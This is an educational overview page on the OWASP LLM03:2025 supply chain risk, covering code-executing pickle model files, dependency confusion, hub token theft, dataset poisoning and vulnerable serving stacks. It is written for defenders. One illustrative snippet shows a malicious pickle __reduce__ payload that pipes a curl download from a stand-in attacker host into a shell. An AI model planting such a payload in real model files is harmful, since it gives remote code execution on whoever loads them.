# Supply Chain Vulnerabilities - Overview

## Table of Contents
- [What is an LLM Supply Chain Vulnerability?](#what-is-supply-chain)
- [Why Does This Matter?](#why-does-this-matter)
- [Technical Context](#technical-context)
- [Real-World Impact](#real-world-impact)
- [Prevalence and Trends](#prevalence)
- [Common Misunderstandings](#common-misunderstandings)
- [How It Differs From Related Risks](#how-it-differs)
- [Self-Assessment](#self-assessment)

## What is an LLM Supply Chain Vulnerability?

**LLM03:2025 — Supply Chain** covers the risk that a component you did not build—a pre-trained model, a set of fine-tuning weights, a dataset, a tokenizer, a serving framework, or a Python package—arrives already compromised, tampered with, or otherwise untrustworthy, and you integrate it into your system without ever verifying where it came from. It is not a flaw in *your* prompt handling or *your* model logic. It is a failure of **provenance and trust**: you inherited someone else's problem the moment you ran `pip install` or `from_pretrained(...)`.

Traditional application security already worries about vulnerable third-party libraries (this is OWASP *A06: Vulnerable and Outdated Components*). The LLM supply chain inherits every one of those problems *and adds several new ones that have no equivalent in ordinary software*:

- A **model artifact is executable data**. Many popular model formats are Python pickle streams, and loading one can run arbitrary code—there is no such thing as "just downloading the weights."
- A model's behaviour is **opaque**. A backdoored model passes every functional test yet misbehaves only on a secret trigger. You cannot code-review a 7-billion-parameter tensor the way you review a function.
- The **training data is part of the supply chain**. A model fine-tuned on a poisoned public dataset carries that poison forward, even if the weights were never touched after training.
- The ecosystem depends on **open community hubs** (Hugging Face, PyPI, npm, dataset mirrors) where anyone can publish, typosquat, or hijack an abandoned name.

In the 2025 edition of the OWASP Top 10 for LLM Applications, this category was expanded from the 2023 "Supply Chain Vulnerabilities" entry to explicitly include **third-party pre-trained models, LoRA adapters and other fine-tunes, on-device/edge model distribution, and the unclear terms, licensing, and data-protection posture of model and dataset providers**.

### Core Concept

```
Trusted supply chain:                 Compromised supply chain:
  source pinned + verified              "latest" pulled from anywhere
  hash / signature checked              no integrity check at all
  safetensors (inert weights)           pickle / torch.load (executes code)
  SBOM / AI-BOM inventory               unknown transitive dependencies
  license + provenance reviewed         backdoored fine-tune, poisoned dataset
  scanned before load                   loaded straight into production
```

The essential question of LLM03 is simple and unglamorous: **“Do you actually know what you just loaded, and can you prove it has not been altered since the author published it?”** For most teams shipping AI features today, the honest answer is no.

## Why Does This Matter?

Supply chain compromise is attractive to attackers because it is a **force multiplier**: poison one popular model or package and you compromise every downstream consumer at once, silently, before any of your own defensive code ever runs. The malicious payload executes *at load time*, inside your trust boundary, with your service account's permissions.

### Business Impact
- **Remote code execution on your infrastructure**: A malicious model or package runs code on the machine that loads it—often a GPU box with cloud credentials, database access, and internal network reachability.
- **Silent, long-dwell backdoors**: A tampered model can behave perfectly until a hidden trigger fires, so the compromise survives QA, ships to customers, and is discovered only after damage is done.
- **Data exfiltration and credential theft**: Load-time payloads routinely harvest environment variables, cloud metadata tokens, SSH keys, and Hugging Face / registry tokens, then pivot.
- **Regulatory and contractual exposure**: Shipping a model whose license forbids commercial use, or whose training data was scraped unlawfully, creates IP and privacy liability (GDPR, licensing disputes) regardless of intent.
- **Reputational and trust damage**: "Our AI feature shipped malware" or "our chatbot was backdoored" is a headline that erodes customer trust far beyond the technical incident.

### Technical Impact
- **Arbitrary code execution at deserialization time**: `pickle`, `torch.load`, Keras `Lambda` layers, and joblib artifacts can all execute attacker code the instant they are opened.
- **Model integrity loss**: Tampered weights or a malicious LoRA adapter can introduce bias, backdoors, or degraded safety alignment invisible to functional tests.
- **Dependency confusion and typosquatting**: A subtly misnamed or version-shadowing package is resolved instead of the one you intended, injecting hostile code into your build.
- **Poisoned provenance**: A model card, dataset, or benchmark you trusted was itself falsified, so your "verification" verified nothing.
- **Vulnerable serving stack**: Outdated inference servers, web UIs, and orchestration frameworks (the plumbing around the model) expose their own RCE and auth-bypass bugs.

## Technical Context

### The LLM Supply Chain, End to End

```
[Base model author] -> [Model hub] -> [Fine-tune / LoRA] -> [Packaging] -> [Serving stack] -> [Your app]
        |                  |               |                    |                |               |
   training data      account can       adapter can        pickle vs        vulnerable       loads & trusts
   may be poisoned    be hijacked       carry backdoor     safetensors      dependencies     everything above
```

Every arrow in that chain is a trust boundary, and each one is routinely crossed with no verification at all. The most important thing to understand is that a model file is **not** passive data.

#### Why loading a model can run code

Python's `pickle` format is a *program*, not a document: it encodes instructions that reconstruct objects, and those instructions can include arbitrary callables via the `__reduce__` mechanism. PyTorch's classic `torch.load` is built on pickle, so a `.bin`, `.pt`, or `.ckpt` checkpoint can execute code the moment you deserialize it—before you run a single inference.

```
# Conceptually, a malicious checkpoint embeds something like this:
class Payload:
    def __reduce__(self):
        import os
        return (os.system, ("curl -s https://evil.example/x | sh",))

# torch.load(...) / pickle.load(...) will EXECUTE that during "loading".
# No inference has run. The model was never even used.
```

This is why the ecosystem is migrating to **safetensors**: a format that stores only raw tensors plus a JSON header, contains no executable opcodes, and therefore cannot run code when loaded. Formats matter more than any single scan.

#### The many entry points

| Supply chain element | How it is compromised | Primary consequence |
| --- | --- | --- |
| Pre-trained model weights | Malicious pickle payload; tampered tensors; backdoor trigger | RCE on load; hidden malicious behaviour |
| Model hub account (e.g. Hugging Face) | Leaked write token; hijacked/abandoned namespace | Legit repo replaced with trojaned artifact |
| LoRA / adapter / fine-tune | Backdoor introduced during fine-tuning; malicious adapter | Integrity loss even over a clean base model |
| Training / RAG dataset | Web-scale poisoning; frontrunning expired dataset URLs | Poisoned behaviour baked into weights or retrieval |
| Python / npm package | Typosquat, dependency confusion, hijacked maintainer | Hostile code in your build and runtime |
| Serving / orchestration stack | Outdated framework with known CVEs; exposed dashboards | RCE, auth bypass, cluster takeover |
| Provider terms & license | Unclear licensing, non-commercial data, T&C changes | Legal, IP, and compliance exposure |

### Formats: which ones execute code?

| Format / extension | Loaded via | Can execute code on load? |
| --- | --- | --- |
| `.safetensors` | `safetensors.torch.load_file` | No — inert tensors + JSON header |
| `.bin`, `.pt`, `.pth`, `.ckpt` | `torch.load` (pickle) | Yes — arbitrary code via pickle |
| `.pkl`, `.joblib` | `pickle` / `joblib.load` | Yes |
| `.h5` / Keras SavedModel | `keras.models.load_model` | Yes — `Lambda` layers embed code |
| GGUF | llama.cpp loaders | Largely data; still verify source and parser version |

## Real-World Impact

The incidents below are described as **classes of documented, publicly reported events**. Specifics (exact counts, dates, package names) vary between sources; treat them as illustrative of a repeatable pattern rather than precise figures.

### Case Class 1: Malicious models on public hubs
Security researchers (for example JFrog and ReversingLabs) have repeatedly reported models hosted on the Hugging Face Hub that carried **pickle-based payloads executing code on load**. Some samples deliberately used broken or non-standard pickle streams to slip past automated scanners (a technique dubbed "nullifAI") while still executing on the victim's machine.
**Root cause**: Open publishing plus a code-executing format plus consumers who call `from_pretrained`/`torch.load` on untrusted repos without scanning or format restrictions.

### Case Class 2: Dependency-confusion in the ML toolchain
In late 2022 the PyTorch project disclosed that a dependency of its nightly builds, `torchtriton`, was **shadowed by a malicious package of the same name on the public PyPI index**. Because the public index took precedence during resolution, affected installs pulled the hostile package, which exfiltrated environment data. This is the canonical example of dependency confusion striking core ML infrastructure.
**Root cause**: A private/internal package name that also existed (or could be registered) on a public index, with no pinning, index scoping, or hash verification.

### Case Class 3: Leaked hub tokens and account takeover
Researchers (for example Lasso Security) have found **exposed Hugging Face access tokens** committed to public repositories, some granting write access to models and datasets owned by major organizations. A stolen write token lets an attacker replace a trusted artifact in place—every downstream `from_pretrained` then pulls the trojaned version.
**Root cause**: Registry credentials treated casually; broad token scopes; no provenance check that would notice a swapped artifact.

### Case Class 4: Poisoning public training / RAG datasets
Academic work such as Carlini et al.'s "Poisoning Web-Scale Training Datasets is Practical" demonstrated realistic attacks (split-view poisoning and **frontrunning expired dataset URLs**) against the kind of large public corpora used to train and fine-tune models. Poison introduced upstream propagates into every model trained on that data.
**Root cause**: Datasets referenced by mutable URLs with no content-hash pinning, so what you download is not necessarily what the dataset authors curated.

### Case Class 5: Vulnerable serving and orchestration stacks
The frameworks *around* the model are ordinary software with ordinary bugs. Public findings against ML infrastructure—such as Oligo's "ShadowRay" work on exposed Ray clusters, and a steady stream of CVEs in inference UIs and servers (Gradio, and others)—show that an outdated or exposed serving stack is often the easiest way in, model or no model.
**Root cause**: Rapidly moving AI infra pulled in at "latest," rarely patched, and sometimes exposed to the internet without authentication.

## Prevalence and Trends

Rather than cite a single disputed statistic, the durable picture is:
- Supply chain risk was significant enough that OWASP kept it in the LLM Top 10 across editions and **broadened its scope for 2025** to cover third-party models, adapters, and provider terms.
- The underlying enabler—**code-executing model formats**—is extremely common: a large fraction of artifacts on public hubs are still pickle-based rather than safetensors.
- General software supply chain attacks (typosquatting, dependency confusion, maintainer hijacks on PyPI and npm) have risen year over year, and the ML ecosystem is a prime, fast-growing target.
- Most teams have **no AI-BOM**: they cannot enumerate which models, adapters, datasets, and model-serving dependencies are in production, let alone verify them.

> Note: exact percentages and incident counts differ between reports and change quickly. The reliable takeaway is that the LLM supply chain is broad, under-inventoried, and actively targeted—and that the single biggest lever is choosing inert formats and verifying provenance.

## Common Misunderstandings

### Myth 1: "Downloading a model is just downloading data"
**Reality**: Pickle-based checkpoints execute code on load. Opening the file *is* running the author's program. Only inert formats like safetensors make "just data" literally true.

### Myth 2: "It's on Hugging Face, so it's been vetted"
**Reality**: Public hubs are open-publishing platforms, not curated app stores. Automated pickle scanning helps but has been evaded; download counts and stars are not integrity guarantees.

### Myth 3: "We passed a malware scan, so the model is safe"
**Reality**: A scanner catches known-bad pickle opcodes, not a semantic *backdoor* in the weights. A model can be malware-free and still be trained to misbehave on a secret trigger. Format restriction, provenance, and behavioural testing all matter.

### Myth 4: "We pinned our top-level packages, so the build is reproducible"
**Reality**: Transitive dependencies and unpinned model/dataset URLs are the usual entry points. Without hashes and a lockfile that covers the full tree, "pinned" is a comforting illusion.

### Myth 5: "This is the same as poisoning (LLM04)"
**Reality**: They overlap but are distinct. LLM04 (Data and Model Poisoning) is about *how* malicious behaviour is introduced into training. LLM03 is about *trust and provenance of third-party components*—the fact that you imported someone else's poisoned or tampered artifact at all. A poisoned dataset you pulled from a public mirror is a supply chain failure (LLM03) that results in poisoning (LLM04).

### Myth 6: "License and terms are legal's problem, not security's"
**Reality**: Unclear or non-commercial licenses, and providers that can change terms or training-data claims, are a supply chain risk to availability and compliance. A model you cannot legally ship is as broken, operationally, as one that fails to load.

## How It Differs From Related Risks

| Aspect | LLM03 Supply Chain | LLM04 Data & Model Poisoning | A06 Vulnerable Components |
| --- | --- | --- | --- |
| **Core question** | Can I trust this third-party artifact's origin? | Was malicious behaviour trained in? | Is this dependency patched? |
| **Typical entry** | Hub, PyPI/npm, dataset mirror, provider | Training/fine-tuning pipeline | Library version |
| **Signature move** | Verify provenance, hashes, signatures; inert formats | Curate data, evaluate behaviour | Upgrade, SCA scan |
| **Failure mode** | RCE on load; trojaned artifact swapped in | Backdoor / bias in outputs | Known CVE exploited |

## Self-Assessment

Ask these questions about your LLM stack:
- [ ] Can you produce an AI-BOM listing every model, adapter, dataset, and serving dependency in production?
- [ ] Is every model artifact loaded from a **pinned revision** (commit hash), not a mutable tag or "latest"?
- [ ] Do you verify a **hash or signature** for each model before loading it?
- [ ] Do you prefer `safetensors` and refuse or sandbox pickle-based formats from untrusted sources?
- [ ] Are models scanned (e.g. pickle/opcode scanning) before they ever reach production?
- [ ] Are Python/npm dependencies fully locked **with hashes**, and is your internal index protected against dependency confusion?
- [ ] Are datasets referenced by content hash rather than a mutable URL?
- [ ] Is your model-serving stack (inference server, UI, orchestrator) patched and never exposed unauthenticated?
- [ ] Have the license and data-protection terms of every third-party model and dataset been reviewed?
- [ ] Would you *notice* if a trusted upstream artifact were swapped for a tampered one tomorrow?

Several "no" or "not sure" answers mean you are trusting components you cannot verify—the exact condition LLM03 describes.

## Key Takeaways

1. **A model is executable, not inert.** Format choice (safetensors over pickle) is the highest-leverage control you have.
2. **Provenance beats reputation.** Pin revisions, verify hashes/signatures, and confirm the author—stars and download counts prove nothing.
3. **Inventory everything.** You cannot defend a supply chain you have never enumerated; build an AI-BOM.
4. **The plumbing counts too.** Packages, datasets, and serving frameworks are all part of the chain and all get attacked.
5. **Assume swap-in.** Design so that a tampered upstream artifact is detected by integrity checks before it ever loads.

## Next Steps

- **[Attack Vectors](attack-vectors.html)**: How attackers poison and hijack the LLM supply chain, with code.
- **[Prevention](prevention.html)**: Layered defenses—provenance, inert formats, scanning, AI-BOM, sandboxing.
- **[Examples](examples.html)**: Vulnerable vs. secure model loading and dependency handling.
- **[Hands-On Lab](./lab/supply-chain-vulnerabilities/)**: Practice detecting and safely loading untrusted models.
